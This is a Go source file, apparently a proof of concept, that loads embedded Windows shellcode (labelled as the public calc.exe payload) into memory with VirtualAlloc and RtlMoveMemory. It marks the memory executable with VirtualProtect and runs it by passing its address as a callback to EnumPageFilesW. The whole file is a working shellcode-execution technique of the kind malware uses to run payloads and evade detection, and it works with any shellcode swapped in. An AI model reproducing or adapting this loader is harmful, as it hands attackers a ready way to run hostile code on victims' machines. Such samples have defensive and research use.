package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"unsafe"
)

const (
	//Windows constants used with Windows API calls
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04
)

func main() {
	sc := []byte{
		//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
		0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
		0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
		0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
		0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
		0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
		0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
		0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
		0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
		0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
		0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
		0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
		0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
		0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
		0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
		0xd7,
	}
	kernel32 := windows.NewLazySystemDLL("kernel32")
	psapi := windows.NewLazySystemDLL("psapi.dll")
	EnumPageFilesW := psapi.NewProc("EnumPageFilesW")

	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}
	_, _, errRtlMoveMemory := RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if errRtlMoveMemory != nil && errRtlMoveMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlMoveMemory:\r\n%s", errRtlMoveMemory.Error()))
	}
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	EnumPageFilesW.Call(addr, 0)
}
